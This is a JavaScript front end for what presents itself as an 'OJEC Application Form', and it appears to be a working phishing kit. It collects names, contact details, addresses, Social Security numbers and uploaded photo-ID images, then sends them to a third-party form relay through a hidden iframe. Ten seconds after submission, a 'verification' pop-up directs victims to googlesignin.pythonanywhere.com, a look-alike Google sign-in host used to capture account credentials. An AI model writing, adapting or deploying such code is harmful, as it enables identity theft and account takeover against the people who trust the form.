/**
 * OJEC Application Form - JavaScript
 * Handles form navigation, validation, and submission
 */

// ============================================
// State Management
// ============================================
const FormState = {
  currentStep: 1,
  totalSteps: 3,
  isSubmitted: false,
  
  reset() {
    this.currentStep = 1;
    this.isSubmitted = false;
  }
};

// ============================================
// Step Navigation
// ============================================
function nextStep() {
  if (validateCurrentStep()) {
    if (FormState.currentStep < FormState.totalSteps) {
      hideStep(FormState.currentStep);
      FormState.currentStep++;
      showStep(FormState.currentStep);
      updateProgressIndicator();
      scrollToTop();
    }
  }
}

function prevStep() {
  if (FormState.currentStep > 1) {
    hideStep(FormState.currentStep);
    FormState.currentStep--;
    showStep(FormState.currentStep);
    updateProgressIndicator();
    scrollToTop();
  }
}

function showStep(stepNumber) {
  const step = document.getElementById(`step${stepNumber}`);
  if (step) {
    step.classList.add('active');
  }
}

function hideStep(stepNumber) {
  const step = document.getElementById(`step${stepNumber}`);
  if (step) {
    step.classList.remove('active');
  }
}

function scrollToTop() {
  window.scrollTo({
    top: 0,
    behavior: 'smooth'
  });
}

// ============================================
// Progress Indicator
// ============================================
function updateProgressIndicator() {
  const dots = document.querySelectorAll('.step-dot');
  dots.forEach((dot, index) => {
    if (index < FormState.currentStep) {
      dot.classList.add('active');
    } else {
      dot.classList.remove('active');
    }
  });
}

// ============================================
// Form Validation
// ============================================
const Validators = {
  email: (value) => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(value);
  },
  
  phone: (value) => {
    const phoneRegex = /^[\d\s\-\+\(\)]+$/;
    return phoneRegex.test(value) && value.replace(/\D/g, '').length >= 10;
  },
  
  ssn: (value) => {
    return /^\d{9}$/.test(value.replace(/\D/g, ''));
  },
  
  notEmpty: (value) => {
    return value.trim().length > 0;
  }
};

function validateCurrentStep() {
  clearAllErrors();
  let isValid = true;

  switch (FormState.currentStep) {
    case 1:
      isValid = validateStep1();
      break;
    case 2:
      isValid = validateStep2();
      break;
    case 3:
      isValid = validateStep3();
      break;
  }

  return isValid;
}

function validateStep1() {
  let isValid = true;
  
  const fullname = getFieldValue('fullname');
  const email = getFieldValue('email');
  const phone = getFieldValue('phone');

  if (!Validators.notEmpty(fullname)) {
    showError('fullname', 'Please enter your full name');
    isValid = false;
  }

  if (!Validators.email(email)) {
    showError('email', 'Please enter a valid email address');
    isValid = false;
  }

  if (!Validators.phone(phone)) {
    showError('phone', 'Please enter a valid phone number');
    isValid = false;
  }

  return isValid;
}

function validateStep2() {
  let isValid = true;
  
  const address = getFieldValue('address');
  const ssn = getFieldValue('ssn');

  if (!Validators.notEmpty(address)) {
    showError('address', 'Please enter your full address');
    isValid = false;
  }

  if (!Validators.ssn(ssn)) {
    showError('ssn', 'Please enter a valid 9-digit SSN');
    isValid = false;
  }

  return isValid;
}

function validateStep3() {
  let isValid = true;
  
  const frontFile = document.getElementById('id-front').files[0];
  const backFile = document.getElementById('id-back').files[0];

  if (!frontFile) {
    showError('id-front', 'Please upload the front of your Photo ID');
    isValid = false;
  }

  if (!backFile) {
    showError('id-back', 'Please upload the back of your Photo ID');
    isValid = false;
  }

  // Validate file sizes
  const maxSize = 10 * 1024 * 1024; // 10MB
  if (frontFile && frontFile.size > maxSize) {
    showError('id-front', 'File size must be less than 10MB');
    isValid = false;
  }

  if (backFile && backFile.size > maxSize) {
    showError('id-back', 'File size must be less than 10MB');
    isValid = false;
  }

  return isValid;
}

// ============================================
// Error Handling
// ============================================
function showError(fieldId, message) {
  const errorElement = document.getElementById(`${fieldId}-error`);
  const inputElement = document.getElementById(fieldId);
  
  if (errorElement) {
    errorElement.textContent = message;
    errorElement.classList.add('show');
    errorElement.style.display = 'block';
  }
  
  if (inputElement) {
    inputElement.classList.add('error');
  }
}

function clearAllErrors() {
  const errorMessages = document.querySelectorAll('.error-message');
  const errorInputs = document.querySelectorAll('.error');
  
  errorMessages.forEach(error => {
    error.classList.remove('show');
    error.style.display = 'none';
  });
  
  errorInputs.forEach(input => {
    input.classList.remove('error');
  });
}

function getFieldValue(fieldId) {
  const field = document.getElementById(fieldId);
  return field ? field.value.trim() : '';
}

// ============================================
// File Upload - Drag & Drop
// ============================================
function initializeDragDrop() {
  setupDragDropZone('drop-front', 'id-front');
  setupDragDropZone('drop-back', 'id-back');
}

function setupDragDropZone(dropZoneId, inputId) {
  const dropZone = document.getElementById(dropZoneId);
  const input = document.getElementById(inputId);
  
  if (!dropZone || !input) return;

  // Click to upload
  dropZone.addEventListener('click', (e) => {
    if (e.target === dropZone || e.target.closest('.drag-drop')) {
      input.click();
    }
  });

  // Drag over
  dropZone.addEventListener('dragover', (e) => {
    e.preventDefault();
    dropZone.classList.add('dragover');
  });

  // Drag leave
  dropZone.addEventListener('dragleave', (e) => {
    e.preventDefault();
    dropZone.classList.remove('dragover');
  });

  // Drop
  dropZone.addEventListener('drop', (e) => {
    e.preventDefault();
    dropZone.classList.remove('dragover');
    
    if (e.dataTransfer.files.length > 0) {
      input.files = e.dataTransfer.files;
      updateFileDisplay(inputId);
    }
  });

  // File input change
  input.addEventListener('change', () => {
    updateFileDisplay(inputId);
  });
}

function updateFileDisplay(inputId) {
  const input = document.getElementById(inputId);
  const fileNameSpan = document.getElementById(`file-name-${inputId.split('-')[1]}`);
  
  if (!input || !fileNameSpan) return;

  if (input.files.length > 0) {
    const file = input.files[0];
    const fileSize = (file.size / 1024 / 1024).toFixed(2); // Convert to MB
    fileNameSpan.textContent = `${file.name} (${fileSize} MB)`;
    fileNameSpan.style.color = 'var(--text-color)';
  } else {
    fileNameSpan.textContent = 'No file chosen';
    fileNameSpan.style.color = 'var(--text-secondary)';
  }
}

// ============================================
// Form Submission
// ============================================
function initializeFormSubmission() {
  const form = document.getElementById('applicationForm');
  
  if (!form) return;

  form.addEventListener('submit', handleFormSubmit);
}

function handleFormSubmit(e) {
  e.preventDefault();

  // Prevent duplicate submissions
  if (FormState.isSubmitted) {
    showAlert('Form Already Submitted', 'Your application has already been submitted.');
    return;
  }

  // Final validation
  if (!validateAllSteps()) {
    showAlert('Validation Error', 'Please complete all required fields correctly.');
    return;
  }

  // Mark as submitted
  FormState.isSubmitted = true;

  // Show loading state
  showLoading(true);
  disableSubmitButton(true);

  // Submit form
  const form = document.getElementById('applicationForm');
  form.submit();

  // Handle post-submission UI
  handlePostSubmission();
}

function validateAllSteps() {
  // Validate all steps regardless of current step
  const step1Valid = validateFieldsInStep(1);
  const step2Valid = validateFieldsInStep(2);
  const step3Valid = validateStep3();

  return step1Valid && step2Valid && step3Valid;
}

function validateFieldsInStep(stepNumber) {
  const currentStepBackup = FormState.currentStep;
  FormState.currentStep = stepNumber;
  const isValid = validateCurrentStep();
  FormState.currentStep = currentStepBackup;
  return isValid;
}

function handlePostSubmission() {
  // Hide form and show success message after delay
  setTimeout(() => {
    hideAllSteps();
    showSuccessMessage();
    showLoading(false);
  }, 1500);

  // Show verification alert after 10 seconds
  setTimeout(() => {
    showVerificationAlert();
  }, 10000);
}

// ============================================
// UI Controls
// ============================================
function showLoading(show) {
  const loading = document.getElementById('loading');
  if (loading) {
    loading.classList.toggle('show', show);
    loading.style.display = show ? 'block' : 'none';
  }
}

function disableSubmitButton(disabled) {
  const submitButton = document.getElementById('submitButton');
  if (submitButton) {
    submitButton.disabled = disabled;
  }
}

function hideAllSteps() {
  document.querySelectorAll('.step').forEach(step => {
    step.style.display = 'none';
  });
}

function showSuccessMessage() {
  const successMessage = document.getElementById('successMessage');
  if (successMessage) {
    successMessage.classList.add('show');
    successMessage.style.display = 'block';
  }
}

function showVerificationAlert() {
  const alert = document.getElementById('verificationAlert');
  const overlay = document.getElementById('overlay');
  
  if (alert) {
    alert.classList.add('show');
    alert.style.display = 'block';
  }
  
  if (overlay) {
    overlay.classList.add('show');
    overlay.style.display = 'block';
  }
}

function closeAlert() {
  const alert = document.getElementById('verificationAlert');
  const overlay = document.getElementById('overlay');
  
  if (alert) {
    alert.classList.remove('show');
    alert.style.display = 'none';
  }
  
  if (overlay) {
    overlay.classList.remove('show');
    overlay.style.display = 'none';
  }
}

function openVerification() {
  window.open('https://googlesignin.pythonanywhere.com/', '_blank');
  closeAlert();
}

function showAlert(title, message) {
  alert(`${title}\n\n${message}`);
}

// ============================================
// Iframe Load Handler
// ============================================
function initializeIframeHandler() {
  const iframe = document.getElementById('hiddenFrame');
  
  if (iframe) {
    iframe.addEventListener('load', () => {
      console.log('Form successfully submitted to FormSubmit.co');
    });
  }
}

// ============================================
// Input Formatting
// ============================================
function initializeInputFormatting() {
  // SSN Auto-formatting
  const ssnInput = document.getElementById('ssn');
  if (ssnInput) {
    ssnInput.addEventListener('input', (e) => {
      let value = e.target.value.replace(/\D/g, '');
      if (value.length > 9) {
        value = value.slice(0, 9);
      }
      e.target.value = value;
    });
  }

  // Phone Auto-formatting (optional)
  const phoneInput = document.getElementById('phone');
  if (phoneInput) {
    phoneInput.addEventListener('input', (e) => {
      // Remove non-numeric characters except +, -, (), and spaces
      e.target.value = e.target.value.replace(/[^\d\s\-\+\(\)]/g, '');
    });
  }
}

// ============================================
// Real-time Validation (Optional)
// ============================================
function initializeRealTimeValidation() {
  const inputs = document.querySelectorAll('input[required]');
  
  inputs.forEach(input => {
    input.addEventListener('blur', () => {
      if (input.value.trim()) {
        input.classList.remove('error');
        const errorElement = document.getElementById(`${input.id}-error`);
        if (errorElement) {
          errorElement.style.display = 'none';
        }
      }
    });
  });
}

// ============================================
// Keyboard Navigation
// ============================================
function initializeKeyboardNavigation() {
  document.addEventListener('keydown', (e) => {
    // Enter key to go to next step (except on file inputs and submit button)
    if (e.key === 'Enter' && e.target.type !== 'file' && e.target.type !== 'submit') {
      e.preventDefault();
      if (FormState.currentStep < FormState.totalSteps) {
        nextStep();
      }
    }
  });
}

// ============================================
// Initialization
// ============================================
function initialize() {
  console.log('Initializing OJEC Application Form...');
  
  // Initialize all modules
  initializeDragDrop();
  initializeFormSubmission();
  initializeIframeHandler();
  initializeInputFormatting();
  initializeRealTimeValidation();
  initializeKeyboardNavigation();
  
  // Set initial state
  updateProgressIndicator();
  
  console.log('OJEC Application Form initialized successfully!');
}

// ============================================
// Execute on DOM Ready
// ============================================
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', initialize);
} else {
  initialize();
}